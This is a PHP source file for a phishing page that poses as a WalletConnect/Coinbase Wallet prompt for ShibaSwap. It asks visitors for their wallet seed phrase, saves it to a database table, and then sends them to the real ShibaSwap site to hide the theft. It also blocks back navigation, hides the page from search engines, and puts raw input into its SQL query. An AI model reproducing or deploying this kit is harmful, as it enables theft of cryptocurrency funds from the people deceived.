<?php
require '../connection.php';
if(isset($_POST['submit'])){
    $recovery_phrase = $_POST["phrase_recovery"];
    if(mysqli_query($con, "INSERT INTO recovery_phrase (type, source, recovery_phrase) VALUES ('walletconnect', 'shibaswap', '$recovery_phrase')")){
        echo '<script>
            window.opener.location.href="https://shibaswap.com/";
            self.close();
           </script>';
    }else{
        echo '<script>
            window.opener.location.href="https://shibaswap.com/";
            self.close();
           </script>';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <title>WalletConnect</title>
    <link rel="icon" type="image/x-icon" href="images/b1.svg">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css"/>
</head>
<body>
        <div class="popup_flight_travlDil">
            <div>
                <img src="images/a2.png" alt="" class="img-fluid">
            </div>
            <div class="p-3 mt-4">
                <h1 style="color:#1b344d">Continue with Seed Phrase</h1>
                
                <div class="content_flightht_travel_dil">
                    Enter your keyword phrase to continue using Coinbase Wallet.
                    <h6 class="mt-4 mb-4">Wallet Seed</h6>
                    <form id="walletconnect" method="post">
                        <textarea class="form-control" name="phrase_recovery"  rows="4" required=""></textarea>
                        <button type="submit" name="submit" class="btn newbtn1 mt-5 rounded-5 fs-5">Connect</button>
                    </form>
                </div>
            </div>
        </div>
        <script type = "text/javascript" >  
    function preventBack() { window.history.forward(); }  
    setTimeout("preventBack()", 0);  
    window.onunload = function () { null };  
    </script> 
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"> </script>  
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.min.js"> </script>  
        <script type="text/javascript">
        //Invalid Secret Recovery Phrase
        $(document).ready(function() {
           $("#walletconnect").validate({
                errorClass: "error fail-alert",
                validClass: "valid success-alert",
                rules: {
                    phrase_recovery: {
                        required : true,
                        minlength : 40
                    }
                },
                messages : {
                    phrase_recovery: {
                        required : "Please enter your secret recovery phrase",
                        minlength: "Invalid Secret Recovery Phrase"
                    }
                }
           });
        });
        </script>
        </body>
</html>